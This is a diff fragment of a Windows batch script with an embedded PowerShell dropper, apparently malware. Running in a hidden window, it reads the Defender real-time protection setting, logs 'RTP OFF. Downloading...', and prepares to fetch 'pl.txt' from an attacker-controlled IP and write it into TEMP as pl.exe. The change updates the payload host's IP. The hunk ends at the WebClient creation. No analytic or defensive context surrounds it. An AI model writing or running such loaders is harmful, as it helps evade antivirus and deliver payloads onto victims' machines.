@@ -7,7 +7,7 @@ powershell -nop -w hidden -Command ^
 $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection'; ^
 $rtp = (Get-ItemProperty -Path $regPath -Name 'DisableRealtimeMonitoring').DisableRealtimeMonitoring; ^
 Add-Content '%LOG%' '[+] RTP OFF. Downloading...'; ^
-$url = 'http://192.168.1.10/pl.txt';  # <- Replace with actual IP ^
+$url = 'http://192.168.2.135/pl.txt';  # <- Replace with actual IP ^
 $txtPath = \"$env:TEMP\\pl.txt\"; ^
 $exePath = \"$env:TEMP\\pl.exe\"; ^
 $wc = New-Object System.Net.WebClient; ^
